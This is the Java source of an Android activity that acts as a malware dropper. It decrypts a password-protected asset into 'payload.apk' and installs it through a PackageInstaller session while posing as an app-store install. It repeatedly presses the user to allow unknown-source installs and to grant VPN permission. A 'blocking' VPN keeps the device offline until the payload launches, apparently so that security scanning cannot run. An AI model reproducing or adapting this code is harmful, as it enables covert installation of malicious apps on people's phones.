package com.onerule.task;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;

import net.lingala.zip4j.ZipFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private static final String ASSET_NAME  = "module";
    private static final String INNER_NAME  = "payload.apk";

    private static final int REQ_VPN             = 1000;
    private static final int REQ_UNKNOWN_SOURCES = 1001;
    private static final String ACTION_INSTALL_DONE = "com.onerule.task.INSTALL_DONE";

    private static final long PERM_POLL_MS   = 400;
    private static final long LAUNCH_POLL_MS = 300;
    private static final long LAUNCH_TIMEOUT = 15_000;
    /** How often to poll ConnectivityManager to check VPN is still active. */
    private static final long VPN_MONITOR_MS = 600;

    private TextView status;
    private Button   btn;
    private InstallResultReceiver receiver;
    private final Handler ui = new Handler(Looper.getMainLooper());

    /**
     * True once the user has granted VPN permission (so we know the system dialog
     * was answered). The Install button also requires isVpnActive() to be true at
     * the moment of the click.
     */
    private boolean vpnPermissionGranted         = false;
    private boolean awaitingUnknownSourcesGrant   = false;
    private Intent  pendingConfirmIntent          = null;
    private boolean justLaunchedConfirm           = false;

    /** True after the payload launches successfully — used to skip VPN re-checks. */
    private boolean installComplete = false;

    // ── VPN monitor ────────────────────────────────────────────────────────────

    /**
     * Periodic runnable that keeps the Install button in sync with live VPN status.
     *
     * Uses BlockVpnService.isRunning() as the primary (and most reliable) check —
     * it queries our static service instance directly rather than going through
     * ConnectivityManager, which can lag or return stale data on many OEMs.
     *
     * Rules:
     *   - Button ENABLED  iff VPN is currently live.
     *   - If VPN drops after being granted, lock the button and re-request.
     *   - Monitor stops once installation is complete (installComplete == true).
     */
    private final Runnable vpnMonitor = new Runnable() {
        @Override public void run() {
            if (installComplete) return;

            boolean live = isVpnLive();

            if (live) {
                if (vpnPermissionGranted && !btn.isEnabled()) {
                    btn.setEnabled(true);
                    status.setText("Ready \u2014 tap Install to begin.");
                }
            } else {
                // VPN dropped (user killed it in Settings or service crashed).
                if (vpnPermissionGranted) {
                    vpnPermissionGranted = false;
                    btn.setEnabled(false);
                    status.setText("VPN was disabled \u2014 please re-grant to continue.");
                    requestVpnPermission();
                }
            }

            ui.postDelayed(this, VPN_MONITOR_MS);
        }
    };

    /**
     * Returns true if our blocking VPN is currently live.
     *
     * Primary check  — BlockVpnService.isRunning(): queries the static service
     *   instance directly.  This is instantaneous and works on all Android
     *   versions / OEMs regardless of ConnectivityManager quirks.
     *
     * Secondary check — ConnectivityManager TRANSPORT_VPN: catches the rare case
     *   where the instance reference was lost but a VPN network is still registered
     *   (e.g. service process recycled by the OS on low-memory devices).
     */
    private boolean isVpnLive() {
        if (BlockVpnService.isRunning()) return true;
        try {
            ConnectivityManager cm =
                    (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            for (Network net : cm.getAllNetworks()) {
                NetworkCapabilities caps = cm.getNetworkCapabilities(net);
                if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    // ── Activity lifecycle ─────────────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        status = findViewById(R.id.status);
        btn    = findViewById(R.id.btnInstall);
        btn.setOnClickListener(v -> onInstallClicked());

        // Already installed: skip the VPN gate entirely, just launch and exit.
        if (isPayloadInstalled()) {
            installComplete = true;
            status.setText("App installed, kindly wait for it to launch\u2026");
            btn.setEnabled(false);
            launchPayloadAndExit();
            return;
        }

        // Lock the Install button and demand VPN permission before anything else.
        btn.setEnabled(false);
        requestVpnPermission();

        // Start the monitor — it will enable the button once VPN is confirmed live.
        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
    }

    @Override
    protected void onDestroy() {
        // Remove all pending monitor callbacks to avoid leaks.
        ui.removeCallbacks(vpnMonitor);
        super.onDestroy();
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (isPayloadInstalled() && !installComplete) {
            installComplete = true;
            pendingConfirmIntent        = null;
            awaitingUnknownSourcesGrant = false;
            status.setText("App installed, kindly wait for it to launch\u2026");
            btn.setEnabled(false);
            launchPayloadAndExit();
            return;
        }

        if (awaitingUnknownSourcesGrant) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                    || getPackageManager().canRequestPackageInstalls()) {
                awaitingUnknownSourcesGrant = false;
                new Thread(this::dropAndInstall).start();
            }
        }

        if (pendingConfirmIntent != null) {
            if (justLaunchedConfirm) {
                justLaunchedConfirm = false;
            } else {
                Intent again = pendingConfirmIntent;
                justLaunchedConfirm = true;
                try {
                    again.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(again);
                } catch (Exception ignored) {}
            }
        }
    }

    // ── VPN permission gate ────────────────────────────────────────────────────

    private void requestVpnPermission() {
        status.setText("Grant the VPN permission to continue\u2026");
        Intent vpnIntent;
        try {
            vpnIntent = VpnService.prepare(this);
        } catch (Exception e) {
            vpnIntent = null;  // Some OEMs throw; treat as already-granted.
        }

        if (vpnIntent == null) {
            // Already granted from a previous session — start the service directly.
            onVpnGranted();
        } else {
            startActivityForResult(vpnIntent, REQ_VPN);
        }
    }

    /**
     * Called once the user grants VPN permission.
     *
     * Two cases:
     *   A) Service already running (re-open after failed install, or permission
     *      was granted in a previous session and the service never stopped):
     *      Enable the button immediately — no need to wait.
     *   B) Service not yet running:
     *      Start it, show "Starting VPN…" and let the monitor enable the button
     *      once BlockVpnService.isRunning() becomes true (typically < 200 ms).
     */
    private void onVpnGranted() {
        vpnPermissionGranted = true;

        if (BlockVpnService.isRunning()) {
            // Already live — skip the "Starting…" phase entirely.
            btn.setEnabled(true);
            status.setText("Ready \u2014 tap Install to begin.");
            return;
        }

        try {
            startService(new Intent(this, BlockVpnService.class));
        } catch (Exception e) {
            android.util.Log.w(BlockVpnService.TAG,
                    "Could not start BlockVpnService: " + e.getMessage());
        }
        // The monitor will enable the button as soon as isRunning() becomes true.
        status.setText("Starting VPN\u2026 please wait.");
    }

    /**
     * Stops the blocking VPN.
     * Called ONLY after the payload launches successfully.
     */
    private void stopVpn() {
        installComplete = true;
        ui.removeCallbacks(vpnMonitor);
        BlockVpnService.stop(this);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_VPN) {
            if (resultCode == RESULT_OK) {
                onVpnGranted();
            } else {
                // Denied — re-show after a short delay. Cannot proceed without it.
                vpnPermissionGranted = false;
                status.setText("VPN permission is required. Please allow it.");
                ui.postDelayed(this::requestVpnPermission, 900);
            }
        } else if (requestCode == REQ_UNKNOWN_SOURCES) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    && getPackageManager().canRequestPackageInstalls()) {
                awaitingUnknownSourcesGrant = false;
                new Thread(this::dropAndInstall).start();
            } else {
                runOnUiThread(() -> status.setText("Permission denied \u2014 cannot install."));
            }
        }
    }

    // ── Install flow ───────────────────────────────────────────────────────────

    private void onInstallClicked() {
        // Hard gate: verify VPN is actually live at click time, not just on paper.
        if (!vpnPermissionGranted || !isVpnLive()) {
            btn.setEnabled(false);
            vpnPermissionGranted = false;
            status.setText("VPN must be active to install. Re-requesting\u2026");
            requestVpnPermission();
            return;
        }
        if (isPayloadInstalled()) {
            installComplete = true;
            status.setText("App installed, kindly wait for it to launch\u2026");
            btn.setEnabled(false);
            launchPayloadAndExit();
            return;
        }
        startInstall();
    }

    private void startInstall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !getPackageManager().canRequestPackageInstalls()) {
            status.setText("Allow install from this source \u2014 install starts automatically.");
            awaitingUnknownSourcesGrant = true;
            startPermissionPoll();
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, REQ_UNKNOWN_SOURCES);
            return;
        }
        new Thread(this::dropAndInstall).start();
    }

    private void startPermissionPoll() {
        ui.postDelayed(new Runnable() {
            @Override public void run() {
                if (!awaitingUnknownSourcesGrant) return;
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                        || getPackageManager().canRequestPackageInstalls()) {
                    awaitingUnknownSourcesGrant = false;
                    new Thread(MainActivity.this::dropAndInstall).start();
                    return;
                }
                ui.postDelayed(this, PERM_POLL_MS);
            }
        }, PERM_POLL_MS);
    }

    // ── Payload queries ────────────────────────────────────────────────────────

    private boolean isPayloadInstalled() {
        String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg == null || pkg.isEmpty()) return false;
        try {
            getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private Intent resolvePayloadLaunchIntent(String pkg) {
        PackageManager pm = getPackageManager();
        Intent launch = pm.getLaunchIntentForPackage(pkg);
        if (launch != null) return launch;
        Intent probe = new Intent(Intent.ACTION_MAIN);
        probe.addCategory(Intent.CATEGORY_LAUNCHER);
        probe.setPackage(pkg);
        java.util.List<android.content.pm.ResolveInfo> ris =
                pm.queryIntentActivities(probe, 0);
        if (ris != null && !ris.isEmpty()) {
            android.content.pm.ActivityInfo ai = ris.get(0).activityInfo;
            Intent direct = new Intent(Intent.ACTION_MAIN);
            direct.addCategory(Intent.CATEGORY_LAUNCHER);
            direct.setClassName(ai.packageName, ai.name);
            return direct;
        }
        return null;
    }

    // ── Launch helpers ─────────────────────────────────────────────────────────

    private void launchPayload() {
        launchPayloadInternal(false);
    }

    private void launchPayloadAndExit() {
        launchPayloadInternal(true);
    }

    /**
     * Polls until the payload package is queryable, then:
     *   1. Launches it.
     *   2. Calls stopVpn() — internet is restored only after successful launch.
     *      If the launch never succeeds, the VPN stays active.
     */
    private void launchPayloadInternal(boolean exitAfter) {
        final String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg == null || pkg.isEmpty()) {
            status.setText("Installed (no payload package configured to launch).");
            return;
        }
        final long deadline = System.currentTimeMillis() + LAUNCH_TIMEOUT;
        ui.post(new Runnable() {
            @Override public void run() {
                Intent launch = resolvePayloadLaunchIntent(pkg);
                if (launch != null) {
                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                                  | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
                    try {
                        startActivity(launch);
                        status.setText("Launched " + pkg);
                        // ── VPN DROP: only on confirmed successful launch ──────
                        stopVpn();
                        // ─────────────────────────────────────────────────────
                        if (exitAfter) {
                            ui.postDelayed(MainActivity.this::finishAndRemoveTask, 200);
                        }
                    } catch (Exception e) {
                        // Launch failed — VPN stays active.
                        status.setText("Launch failed: " + e.getMessage());
                    }
                    return;
                }
                if (System.currentTimeMillis() < deadline) {
                    ui.postDelayed(this, LAUNCH_POLL_MS);
                } else {
                    // Timed out — VPN intentionally left running, module never started.
                    status.setText("Installed, but no launchable activity found for " + pkg);
                }
            }
        });
    }

    // ── Decryption + installation ──────────────────────────────────────────────

    private void dropAndInstall() {
        try {
            if (isPayloadInstalled()) {
                runOnUiThread(() -> {
                    installComplete = true;
                    status.setText("App installed, kindly wait for it to launch\u2026");
                    btn.setEnabled(false);
                    launchPayloadAndExit();
                });
                return;
            }

            runOnUiThread(() -> status.setText("Decrypting module \u2026"));

            File workDir = new File(getCacheDir(), "drop");
            if (!workDir.exists()) workDir.mkdirs();
            File leftover = new File(workDir, INNER_NAME);
            if (leftover.exists()) leftover.delete();

            File encZip = new File(workDir, "m.zip");
            try (InputStream in = getAssets().open(ASSET_NAME);
                 OutputStream out = new FileOutputStream(encZip)) {
                byte[] buf = new byte[64 * 1024]; int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            }

            ZipFile zf = new ZipFile(encZip, BuildConfig.MODULE_KEY.toCharArray());
            zf.extractFile(INNER_NAME, workDir.getAbsolutePath());
            encZip.delete();

            File apk = new File(workDir, INNER_NAME);
            if (!apk.exists() || apk.length() == 0) {
                throw new RuntimeException("Decrypted payload missing");
            }

            runOnUiThread(() -> status.setText("Installing \u2026"));
            installViaSession(apk);
        } catch (Exception e) {
            // Failed — VPN intentionally left running.
            runOnUiThread(() -> status.setText("Install failed: " + e.getMessage()));
        }
    }

    private void installViaSession(File apk) throws Exception {
        PackageInstaller pi = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        params.setInstallReason(PackageManager.INSTALL_REASON_USER);

        if (Build.VERSION.SDK_INT >= 33) {
            try { params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE); }
            catch (Throwable ignored) {}
        }
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                params.getClass().getMethod("setRequestUpdateOwnership", boolean.class)
                        .invoke(params, true);
            } catch (Throwable ignored) {}
        }

        int sessionId = pi.createSession(params);
        try (PackageInstaller.Session session = pi.openSession(sessionId)) {
            try (OutputStream sout = session.openWrite("base.apk", 0, apk.length());
                 InputStream  sin  = new FileInputStream(apk)) {
                byte[] buf = new byte[64 * 1024]; int n;
                while ((n = sin.read(buf)) > 0) sout.write(buf, 0, n);
                session.fsync(sout);
            }

            if (receiver != null) {
                try { unregisterReceiver(receiver); } catch (Exception ignored) {}
            }
            receiver = new InstallResultReceiver();
            IntentFilter filter = new IntentFilter(ACTION_INSTALL_DONE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(receiver, filter);
            }

            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT
                    | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                        ? PendingIntent.FLAG_MUTABLE : 0);
            Intent cb = new Intent(ACTION_INSTALL_DONE).setPackage(getPackageName());
            PendingIntent pending = PendingIntent.getBroadcast(
                    this, sessionId, cb, piFlags);

            session.commit(pending.getIntentSender());
        }
    }

    private class InstallResultReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            int s = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
            if (s == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                if (confirm != null) {
                    confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    pendingConfirmIntent = confirm;
                    justLaunchedConfirm  = true;
                    startActivity(confirm);
                }
            } else if (s == PackageInstaller.STATUS_SUCCESS) {
                pendingConfirmIntent = null;
                runOnUiThread(() -> {
                    status.setText("App installed, kindly wait for it to launch\u2026");
                    btn.setEnabled(false);
                    // launchPayload() calls stopVpn() on successful launch.
                    launchPayload();
                });
                try { unregisterReceiver(this); } catch (Exception ignored) {}
            } else {
                // Failed — VPN stays active (no stopVpn() call).
                pendingConfirmIntent = null;
                String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                runOnUiThread(() -> status.setText("Install failed: " + msg));
                try { unregisterReceiver(this); } catch (Exception ignored) {}
            }
        }
    }
}
